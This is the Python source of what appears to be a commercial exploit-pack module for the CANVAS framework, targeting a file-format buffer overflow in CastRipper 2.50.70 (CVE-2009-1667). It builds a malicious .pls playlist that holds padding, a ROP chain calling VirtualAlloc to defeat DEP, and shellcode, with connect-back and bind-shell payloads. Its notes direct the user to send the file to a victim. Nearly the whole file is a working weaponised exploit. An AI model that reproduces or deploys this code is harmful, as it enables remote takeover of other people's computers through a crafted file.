
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################
#Standard Imports

import sys
if '.' not in sys.path: sys.path.append('.')
sys.path.append("3rdparty/White_Phosphorus/libs")
import os
import getopt
import socket
import time
import struct

# CANVAS imports
from exploitutils import *
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
from MOSDEF import mosdef
from httpclientside import httpclientside

######################################################################################
NAME='CastRipper PLS File Overflow'
DESCRIPTION='CastRipper Version 2.50.70 PLS File Overflow'
VERSION='1.0'
CHANGELOG="""
"""
######################################################################################
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://mini-stream.net"
DOCUMENTATION["Date public"] = "2010-06-08"
DOCUMENTATION['CVE Name']="CVE-2009-1667"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1667'
DOCUMENTATION["References"] = """
http://mini-stream.net/castripper/
http://www.exploit-db.com/exploits/13768/"""
DOCUMENTATION['Notes']="""
Run the module and send the created file to the target user."""
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION'] = ["2000","2003","XP","Vista","7"]

DEBUGNOTES="""
"""

NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> CastRipper PLS File Overflow
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal DEP

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_castripper/wp_castripper.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return
PORT = 0
targets={
    0 : ["Windows Universal (DEP)", (0x00000000), [WINALL]]    
}
######################################################################################
class theexploit(wp_exploit,httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 1
    
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.badstring='\0\x09\x20\x0a'
        self.name=NAME
        self.port = PORT
        self.filename='tunes.pls'
        self.version=0
        self.autoVersioned = False       
        self.use_universal=True    
        return
    
    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return        
        
    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return      
        
    def neededListenerTypes(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        return self.wp_createWin32Listener()

    def createShellcode(self):
        # We use this function to grab different shellcode type and os types
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    
    
    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:
            self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
                   
        return
    
    def run(self):
        
        filedata=self.makefile()
        self.log('WP> Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('WP> Wrote to %s'%(self.filename))
        
        ret = self.wp_postExploitShellcode()
        if ret:
           return ret        
        
        return 1
        
    def makefile(self):

        file ="c:\\"
        file += wp_randomstring(26121)
            
        file += pack('<L', 0x1001CCC2)      # RETN
        file += wp_randomstring(4)
        
        
        file += pack('<L', 0x1002A47F)      #PUSH ESP
        file += pack('<L', 0x1001CCBE)      #MOV EAX,EBX
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        
        file += pack('<L', 0x1004c060)      # ESI Writeable
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x1002C95C)      # ADD EAX,100
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x100233C2)      # PUSH EAX, POP EDI
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x1002EA41)      # STOS DWORD PTR ES:[EDI]
        file += pack('<L', 0x10025319)      # POP EAX
        file += pack('<L', 0x11113111)      # size
        file += pack('<L', 0x100332B9)      # POP ECX
        file += pack('<L', 0x11111111)      # size
        file += pack('<L', 0x1002753A)      # SUB EAX,ECX

        file += pack('<L', 0x1002EA41)      # STOS DWORD PTR ES:[EDI]
        file += pack('<L', 0x10025319)      # POP EAX
        file += pack('<L', 0x11112111)      # Commit
        file += pack('<L', 0x100332B9)      # POP ECX
        file += pack('<L', 0x11111111)      # Commit
        file += pack('<L', 0x1002753A)      # SUB EAX,ECX
        
        file += pack('<L', 0x1002EA41)      # STOS DWORD PTR ES:[EDI]
        file += pack('<L', 0x10025319)      # POP EAX
        file += pack('<L', 0x11111151)      # protect
        file += pack('<L', 0x100332B9)      # POP ECX
        file += pack('<L', 0x11111111)      # protect
        file += pack('<L', 0x1002753A)      # SUB EAX,ECX

        file += pack('<L', 0x1002EA41)      # STOS DWORD PTR ES:[EDI]
        file += pack('<L', 0x10025319)      # POP EAX
        file += pack('<L', 0x1004A060)      # VAlloc        1004A060

        file += pack('<L', 0x10022CB9)      # MOV EAX,DWORD PTR DS:[EAX]
        file += pack('<L', 0x1001CCC2)      * 28 # RETN
        
        
        file += pack('<L', 0x1002763A)      # CALL EAX
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x58585858)
        file += pack('<L', 0x10038DB3)      #PUSH ESP, RET)
        
        file += self.shellcode
                
        return file

if __name__=='__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
